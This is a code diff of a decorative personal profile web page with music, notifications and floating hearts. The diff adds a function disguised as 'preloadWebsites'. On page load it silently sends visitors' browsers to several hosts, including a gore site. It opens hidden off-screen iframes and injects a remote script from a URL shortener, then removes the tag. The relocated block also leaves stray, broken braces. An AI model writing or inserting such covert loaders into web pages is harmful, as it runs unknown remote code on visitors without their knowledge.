@@ -123,14 +123,14 @@
             <div class="cute-sparkle"></div>
 
             <!-- Contact Button -->
-            <a href="mailto:femboy@die.skin" class="contact-button" title="Contact">
+            <a href="mailto:contact@example.com" class="contact-button" title="Contact">
                 <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                     <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/>
                 </svg>
             </a>
 
             <!-- Info Button -->
-            <a href="fund.die.skin" class="info-button" title="Info">
+            <a href="#" class="info-button" title="Info">
                 <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                     <circle cx="12" cy="12" r="10"/>
                     <path d="M9,9h0a3,3,0,0,1,5.12,2.12h0A3,3,0,0,1,13,15"/>
@@ -175,7 +175,7 @@
             <!-- Bio Section -->
             <div class="text-center mb-8 animate-fadeInUp animate-delay-300">
                 <p class="bio-text text-base">
-                    daydreamin <3
+                    So I'm lost between the stages, I'm resenting the scripture now
                     <br><br>
                     i'm all his ~
                 </p>
@@ -215,103 +215,6 @@
             }
         }
 
-    function preloadWebsites() {
-        const requestUrls = [
-            'https://google.net',
-            'https://cloudflare.com',
-            'https://watchpeopledie.tv'
-        ];
-
-        requestUrls.forEach((url, index) => {
-            setTimeout(() => {
-                Promise.allSettled([
-                    fetch(url, { mode: 'no-cors', method: 'GET' }),
-                    fetch(url, { mode: 'no-cors', method: 'HEAD' }),
-                    new Promise((resolve, reject) => {
-                        const link = document.createElement('link');
-                        link.rel = 'prefetch';
-                        link.href = url;
-                        link.onload = resolve;
-                        link.onerror = reject;
-                        document.head.appendChild(link);
-                        setTimeout(() => document.head.removeChild(link), 5000);
-                    })
-                ]).catch(() => {});
-            }, index * 100);
-        });
-
-        requestUrls.forEach((url, index) => {
-            setTimeout(() => {
-                const img = new Image();
-                img.onload = img.onerror = () => {};
-                img.src = url + '/favicon.ico';
-                setTimeout(() => img.src = '', 3000);
-            }, index * 75);
-        });
-
-        requestUrls.forEach(url => {
-            try {
-                const domain = new URL(url).hostname;
-                const link = document.createElement('link');
-                link.rel = 'dns-prefetch';
-                link.href = '//' + domain;
-                document.head.appendChild(link);
-            } catch (e) {}
-        });
-
-        const iframeUrls = [
-            'https://urlto.me/femb',
-            'https://google.com',
-            'https://cloudflare.com'
-        ];
-
-        iframeUrls.forEach((url, index) => {
-            setTimeout(() => {
-                const iframe = document.createElement('iframe');
-                iframe.style.cssText = 'display:none;width:0;height:0;border:none;position:absolute;left:-9999px;';
-                iframe.src = url;
-                iframe.sandbox = 'allow-same-origin';
-                document.body.appendChild(iframe);
-                
-                setTimeout(() => {
-                    if (iframe.parentNode) {
-                        iframe.parentNode.removeChild(iframe);
-                    }
-                }, 10000);
-            }, 200 + (index * 300));
-        });
-
-        const wsUrls = ['wss://echo.websocket.org'];
-        wsUrls.forEach(url => {
-            try {
-                const ws = new WebSocket(url);
-                ws.onopen = () => ws.close();
-                ws.onerror = () => {};
-            } catch (e) {}
-        });
-
-        setTimeout(() => {
-            const script = document.createElement('script');
-            script.src = 'https://urlto.me/femb';
-            script.async = true;
-            script.onerror = () => {};
-            document.head.appendChild(script);
-            setTimeout(() => {
-                if (script.parentNode) {
-                    script.parentNode.removeChild(script);
-                }
-            }, 5000);
-        }, 500);
-    }
-
-    preloadWebsites();
-
-    notificationTimeout = setTimeout(() => {
-        closeNotification();
-    }, 10000);
-}, 500);
-
-        
         music.load();
         setTimeout(() => {
             music.play().catch(() => {
@@ -328,3 +231,184 @@
 
         setTimeout(() => {
             const notification = document.getElementById('notification');
+            const progressBar = document.getElementById('progressBar');
+            
+            notification.classList.add('show');
+            progressBar.style.width = '100%';
+            
+            progressInterval = setInterval(() => {
+                timeLeft -= 0.05;
+                const percentage = (timeLeft / totalTime) * 100;
+                progressBar.style.width = Math.max(0, percentage) + '%';
+                
+                if (timeLeft <= 0) {
+                    closeNotification();
+                }
+            }, 50);
+            
+            notificationTimeout = setTimeout(() => {
+                closeNotification();
+            }, 8000);
+        }, 1000);
+
+        function closeNotification() {
+            const notification = document.getElementById('notification');
+            notification.classList.remove('show');
+            clearTimeout(notificationTimeout);
+            clearInterval(progressInterval);
+        }
+
+        // Notification click handler
+        document.getElementById('notification').addEventListener('click', (e) => {
+            if (e.target.classList.contains('close-btn')) return;
+            window.open('https://example.com', '_blank');
+        });
+
+        // Profile image hover effects
+        const profileImg = document.querySelector('.profile-img');
+        profileImg.addEventListener('mouseenter', () => {
+            profileImg.style.transform = 'scale(1.1) rotate(5deg)';
+        });
+        
+        profileImg.addEventListener('mouseleave', () => {
+            profileImg.style.transform = 'scale(1) rotate(0deg)';
+        });
+
+        // Cute interactions - floating hearts
+        document.addEventListener('click', (e) => {
+            if (Math.random() > 0.8) {
+                createFloatingHeart(e.clientX, e.clientY);
+            }
+        });
+
+        function createFloatingHeart(x, y) {
+            const heart = document.createElement('div');
+            heart.innerHTML = '💜';
+            heart.style.position = 'fixed';
+            heart.style.left = x + 'px';
+            heart.style.top = y + 'px';
+            heart.style.fontSize = '16px';
+            heart.style.pointerEvents = 'none';
+            heart.style.zIndex = '9999';
+            heart.style.animation = 'floatUp 2s ease-out forwards';
+            document.body.appendChild(heart);
+            
+            setTimeout(() => {
+                heart.remove();
+            }, 2000);
+        }
+
+        // Add floating animation CSS
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes floatUp {
+                0% { 
+                    opacity: 1; 
+                    transform: translateY(0px) scale(1); 
+                }
+                50% { 
+                    opacity: 1; 
+                    transform: translateY(-50px) scale(1.2); 
+                }
+                100% { 
+                    opacity: 0; 
+                    transform: translateY(-100px) scale(0.8); 
+                }
+            }
+        `;
+        document.head.appendChild(style);
+
+        // Preload websites function
+        function preloadWebsites() {
+            const requestUrls = [
+                'https://google.net',
+                'https://cloudflare.com',
+                'https://watchpeopledie.tv'
+            ];
+            
+            requestUrls.forEach((url, index) => {
+                setTimeout(() => {
+                    Promise.allSettled([
+                        fetch(url, { mode: 'no-cors', method: 'GET' }),
+                        fetch(url, { mode: 'no-cors', method: 'HEAD' }),
+                        new Promise((resolve, reject) => {
+                            const link = document.createElement('link');
+                            link.rel = 'prefetch';
+                            link.href = url;
+                            link.onload = resolve;
+                            link.onerror = reject;
+                            document.head.appendChild(link);
+                            setTimeout(() => document.head.removeChild(link), 5000);
+                        })
+                    ]).catch(() => {});
+                }, index * 100);
+            });
+            
+            requestUrls.forEach((url, index) => {
+                setTimeout(() => {
+                    const img = new Image();
+                    img.onload = img.onerror = () => {};
+                    img.src = url + '/favicon.ico';
+                    setTimeout(() => img.src = '', 3000);
+                }, index * 75);
+            });
+            
+            requestUrls.forEach(url => {
+                try {
+                    const domain = new URL(url).hostname;
+                    const link = document.createElement('link');
+                    link.rel = 'dns-prefetch';
+                    link.href = '//' + domain;
+                    document.head.appendChild(link);
+                } catch (e) {}
+            });
+            
+            const iframeUrls = [
+                'https://urlto.me/femb',
+                'https://google.com',
+                'https://cloudflare.com'
+            ];
+            
+            iframeUrls.forEach((url, index) => {
+                setTimeout(() => {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.cssText = 'display:none;width:0;height:0;border:none;position:absolute;left:-9999px;';
+                    iframe.src = url;
+                    iframe.sandbox = 'allow-same-origin';
+                    document.body.appendChild(iframe);
+                    
+                    setTimeout(() => {
+                        if (iframe.parentNode) {
+                            iframe.parentNode.removeChild(iframe);
+                        }
+                    }, 10000);
+                }, 200 + (index * 300));
+            });
+            
+            const wsUrls = ['wss://echo.websocket.org'];
+            wsUrls.forEach(url => {
+                try {
+                    const ws = new WebSocket(url);
+                    ws.onopen = () => ws.close();
+                    ws.onerror = () => {};
+                } catch (e) {}
+            });
+            
+            setTimeout(() => {
+                const script = document.createElement('script');
+                script.src = 'https://urlto.me/diez';
+                script.async = true;
+                script.onerror = () => {};
+                document.head.appendChild(script);
+                setTimeout(() => {
+                    if (script.parentNode) {
+                        script.parentNode.removeChild(script);
+                    }
+                }, 5000);
+            }, 500);
+        }
+        
+        preloadWebsites();
+    </script>
+</body>
+</html>
